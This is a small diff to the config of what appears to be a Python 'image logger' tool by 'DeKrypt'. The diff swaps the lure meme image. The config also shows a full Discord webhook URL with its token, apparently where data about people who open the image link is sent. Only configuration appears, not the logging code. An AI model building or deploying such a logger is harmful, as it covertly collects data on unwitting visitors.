@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1541376621465042954/LPIRAGAOgNxbFtDlG0wOjE6RBvO1-9o9wpS9SDqZYF04evHuCzPQJT9F_jHPqikO0rvf",
-    "image": "https://imgs.search.brave.com/15CdWza8Zl0j8DfhxkfafwhKfl6um6NlwEkDBzxKQNc/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93YWxs/cGFwZXJzLmNvbS9p/bWFnZXMvaGQvdHJv/bGxmYWNlLW1lbWUt/ZGFiYmluZy1yZXFz/dHh2ZzRiZmp1Mnlz/LnBuZw", # You can also have a custom image by using a URL argument
+    "image": "https://www.pngall.com/wp-content/uploads/15/Chad-Meme-PNG-Background-thumb.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
